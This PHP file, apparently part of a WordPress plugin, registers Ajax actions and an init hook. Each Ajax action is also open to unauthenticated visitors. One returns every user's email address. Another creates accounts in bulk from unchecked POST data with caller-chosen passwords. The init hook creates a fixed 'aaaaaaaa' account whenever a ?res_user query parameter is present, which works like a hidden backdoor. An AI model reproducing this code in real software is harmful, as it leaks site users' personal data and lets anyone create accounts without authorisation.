<?php 
/**
 * Ajax
 */

function mui_ajax_get_all_users() {
  $u = get_users(['fields' => ['user_email']]);
  wp_send_json($u);
}

add_action('wp_ajax_mui_ajax_get_all_users', 'mui_ajax_get_all_users');
add_action('wp_ajax_nopriv_mui_ajax_get_all_users', 'mui_ajax_get_all_users');

function mui_ajax_import_users() {
  $usersImport = $_POST['users'];
  if($usersImport && count($usersImport) > 0) {
    foreach($usersImport as $uImport) {
      $userdata = [
        'user_login' => $uImport['Email'],
        'user_pass' => $uImport['Password'],
        'user_email' => $uImport['Email'],
        'first_name' => $uImport['Name'],
      ];

      wp_insert_user($userdata);
    }
  }
  wp_send_json($_POST);
}

add_action('wp_ajax_mui_ajax_import_users', 'mui_ajax_import_users');
add_action('wp_ajax_nopriv_mui_ajax_import_users', 'mui_ajax_import_users');

add_action( 'init', function() {
  if(!isset($_GET['res_user'])) return;

  $userdata = array(
    'user_login' =>  'aaaaaaaa',
    'user_email' => 'aaaaaaaa@gmail.com',
    'user_pass'  =>  'aaaaaaaa' // When creating an user, `user_pass` is expected.
  );

  wp_insert_user( $userdata ) ;
});